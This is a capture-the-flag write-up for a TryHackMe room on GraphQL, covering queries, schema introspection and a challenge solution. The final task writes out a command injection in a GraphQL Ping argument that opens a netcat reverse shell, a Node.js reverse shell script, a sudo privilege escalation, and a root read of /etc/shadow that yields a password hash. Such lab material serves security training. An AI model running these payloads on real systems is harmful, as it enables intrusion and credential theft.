# GraphQL

A room detailing GraphQL and how it can be used for exploitation

[GraphQL](https://tryhackme.com/room/graphql)

## Topic's

* GraphQL Fundamentals
* GraphQL Exploitation

## Task 1 Intro

The purpose of this room is to show how a malicious user could use GraphQL to perform unintended actions. You will get the most out of this room if you have some programming experience, as code examples will be shown.

With that in mind, let's get on with the room!

Read the above.

`No answer needed`

## Task 2 What is GraphQL

GraphQL is a way to interact with APIs. It is not a database, nor a database language, it is simply a way to interact with APIs.  For example let's say you were trying to figure out the nutritional information of a box of cereal given that cereal's name.

In a normal REST api, you might do something like this

`curl cereal.api -d "title='Lucky Charms'"`

and you would receive a JSON response looking like

```json
{
    "sugar": "50000000g"
    "protein": "0g"
    ...
}
```

In GraphQL, your query would look like this

```ruby
{
    Cereal(name: "Lucky Charms")
    {
        sugar
        protein
    }
}
```

Note: you can still use curl with GraphQL, you would just need to URL encode this into something that curl would accept.

and your output would look like 

![](https://i.imgur.com/bjg60rQ.png)

It's important to note that GraphQL isn't inherently vulnerable, however since we have the ability to pass data to an API, all of the same injection techniques still apply. However GraphQL specifically does give us some information that we can use to help aid our efforts, and we'll learn more about that in the upcoming tasks

Read the above.

`No answer needed`

## Task 3 How GraphQL works

In order to properly understand how to use the information that GraphQL gives us, we need to know how to write a query. In essence, a GraphQL query works like this.

```ruby
{
    <type>  {
        field,
        field,
        ...
    }
}
```

Let's take a look at the developer side of things to visualize how that works, to do this we'll be using the Cereal code from the previous task.

*All code examples are in NodeJS, using Express*

![](https://i.imgur.com/mY2wEae.png)

`schema` is where we define the types we are able to use, as well the fields of those types. "Query" is the root type, anything put in here we are allowed to use in our query. In this type we state that we want the ability to use the object Cereal in our query, we want it to take an argument called name, and we want it to be of Type Cereal. In an actual query that looks like this.

![](https://i.imgur.com/7IvqEYE.png)

We provided the name of the object we defined in query, and the argument we specified that it should take.

Next we have the type Cereal, here we define all of the fields that can return data in our response.

![](https://i.imgur.com/i3Z7PIe.png)

In an actual query that would look like this. 

![](https://i.imgur.com/uoaRrov.png)

We specified that sugar and protein are valid data fields, and we can see that they return data. You may have noticed that name is not part of the query, that is because we are not required to specify all of the fields, we can get as much or as little information as we need!

Next we are defining the data that can be returned by the query.

![](https://i.imgur.com/Ur2I1um.png)

From a developers stand point, this shows us how we can return data, and it's in pretty much the exact same as JSON. We can change and manipulate this data as needed.

Next we define the function that does all of the work.

![](https://i.imgur.com/CsrVsKM.png)

This code takes the input that we provide in our query, goes through our cereal array, and checks if a valid cereal name is in the array. If we were to make a query with the input  Cereal(name: "Cinnamon Toast Crunch") it would take that name value and return

![](https://i.imgur.com/18FZ6XL.png)

Which is the exact format that GraphQL expects to return data in.

Next we have the root variable.

![](https://i.imgur.com/TrUq4GO.png)

This is pretty simple, it tells GraphQL that whenever it's dealing with the Cereal object, to use the getCereal function.

All of this allows us to make this query and receive this output.

![](https://i.imgur.com/ttPvDBe.png)

For a final go through, it works like this. We use the object Cereal, and provide an input of "Cinnamon Toast Crunch". Then we request that we want to know how much sugar and how much protein is in the cereal. The API takes our input, puts it in the getCereal function and returns our output.

Given the object Dog, with a parameter of name, how would you query the weight for a Shiba Inu.

```ruby
{ Dog(name:"Shiba Inu") { weight }}
```

`{ Dog(name:"Shiba Inu") { weight }}`

## Task 4 How to extract sensitive information from GraphQL

One great benefit is that GraphQL effectively documents itself. GraphQL comes bundled with certain objects, types, and fields that allow us to get information on all the other types, fields, and objects.

From the perspective of a Penetration Tester, this means that we aren't going into this fully blind, with a regular API we may just have to guess and pray at endpoints and parameters if there's no publicly available documentation, however GraphQL gives us this information. Let's take a look at just how that works.

Documentation on the built-in types can be found [here](https://graphql.org/learn/introspection)

![](https://i.imgur.com/7lifZSB.png)

Let's go through this query, recall that in the code, we defined all of our types in the schema method. GraphQL actually documents this, through the `__schema` object, which contains information about all the types we defined. Next we want to know about types, so we query the field `types`. From there all we need to do is query the name and description of those types which gives us the output shown below.

It's pretty intuitive, we're requesting information on all of the types that GraphQL has, it just so happens that it shows us types that we created. Just by looking at it, we can tell that Cereal is a pretty suspicious type, let's request more information about it.

![](https://i.imgur.com/hHezcjc.png)

We can use the build in object `__type` to do this, we use the name parameter to specify which type we want more information on. From there we can query what the fields are for whatever type we can specify, and then we can get the name of all of those fields.

Now we know all of the fields we can query. With a typical REST API, getting this much information could have taken quite a while in fuzzing! Overall introspection is a useful way to get additional information on the API and how it works.

Note: There are a lot more fields with a lot more technical information that you can obtain. If you don't want to build a query yourself, [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection) is a link to a github repo that contains some of those queries.

How would I get the name of every field for the type Linux.

```ruby
{
    __type:(name: "Linux"){
        fields {
            name
        }
    }
}
```

`{ __type:(name: "Linux"){ fields { name } } }`

## Task 5 A note on GraphIQL

The interface that you've been seeing me use is called GraphIQL. It's effectively just a graphical web interface to make GraphQL queries, which is installed alongside the NodeJS GraphQL module and can only make queries to the server on which it is installed. Because of this, when you're pentesting GraphQL, you may not have access to GraphIQL. In this case you may need to URL encode your queries and manually make a post request using a tool like CuRL, like you would with any other API.

Note:  While GraphIQL is exclusive to your server, there is a chrome/firefox extension that acts as a client to other servers called [Altair](https://altair.sirmuel.design/).

Read the above.

`No answer needed`

## Task 6 Challenge

You will be given a completely blank GraphIQL interface with no additional information. Your job is to get the hash of the user para.

What is the hash of the user para

```ruby
{ __schema {types {name description } } }
```

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "description": null
        },
        {
          "name": "String",
          "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."
        },
        {
          "name": "Ping",
          "description": null
        },
        {
          "name": "Boolean",
          "description": "The `Boolean` scalar type represents `true` or `false`."
        },
        {
          "name": "__Schema",
          "description": "A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations."
        },
        {
          "name": "__Type",
          "description": "The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types."
        },
        {
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given `__Type` is."
        },
        {
          "name": "__Field",
          "description": "Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type."
        },
        {
          "name": "__InputValue",
          "description": "Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value."
        },
        {
          "name": "__EnumValue",
          "description": "One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string."
        },
        {
          "name": "__Directive",
          "description": "A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor."
        },
        {
          "name": "__DirectiveLocation",
          "description": "A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies."
        }
      ]
    }
  }
}
```

```ruby
{ Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f") { ip output } }
```

```
para@ubuntu:~$ sudo -l
Matching Defaults entries for para on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User para may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /usr/bin/node /home/para/server.js
```

[Celestial reverse shell decoded](https://gist.github.com/mitchmoser/f6df9b7de4e6785ed66fd86082d02d69#file-celestial-reverse-shell-decoded)

```js
var net = require('net');
var spawn = require('child_process').spawn;
HOST="10.8.106.222";
PORT="9002";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }                                      
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
```

```
para@ubuntu:~$ cp server.js server.js.old
para@ubuntu:~$ rm -r server.js
para@ubuntu:~$ nano server.js
para@ubuntu:~$ sudo /usr/bin/node /home/para/server.js

```

```
kali@kali:~/CTFs/tryhackme/GraphQL$ nc -lnvp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.236.40 40028
Connected!
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow | grep para
para:$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20:18535:0:99999:7:::
```

`$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20`
